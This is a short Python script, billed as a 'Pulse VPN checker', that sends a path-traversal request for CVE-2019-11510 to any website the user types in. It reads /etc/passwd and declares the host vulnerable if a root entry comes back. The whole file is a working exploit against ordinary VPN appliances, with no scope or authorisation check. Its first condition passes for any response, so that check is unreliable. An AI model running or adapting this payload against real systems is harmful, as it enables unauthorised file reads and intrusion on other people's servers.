import requests
import re
from colorama import Fore,Style
import time
import pyfiglet
from pyfiglet import Figlet


custom_fig = Figlet(font='digital')
print(Fore.YELLOW+custom_fig.renderText("PULSE VPN CHECKER"))

url=input(Fore.YELLOW+"[+] Enter your desired website to check : https://")
payload="/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/"
regex = "root:x:0:0:root"

print("[+] Preparing to send the request...")
time.sleep(3)

print("[+] Request has been sent!")
response = requests.get("https://"+url+payload)

print("[+] Analyzing the received response...")
time.sleep(3)

if (response.status_code):
    print(Fore.RED+"[+] First Condition has been passed"+Style.RESET_ALL)
    time.sleep(2)
else:
    print(Fore.MAGENTA+"Resutl:")
    print(Fore.GREEN+"[-] https://"+url+" is not Vulnerable to CVE-2019-11510!"+Style.RESET_ALL)

if (re.findall(regex, str(response.content))):
    print(Fore.RED+"[+] Second Condition has been passed")
    print(Fore.MAGENTA+("[+] "+url+"is vulnerable to CVE-2019-11510!!!"+Style.RESET_ALL))
else:
    print(Fore.YELLOW+"[+] Second Condition has been failed")
    print(Fore.MAGENTA+"Resutl: ")
    print(Fore.GREEN+"[-] https://"+url+" is not Vulnerable to CVE-2019-11510!"+Style.RESET_ALL)
    Style.RESET_ALL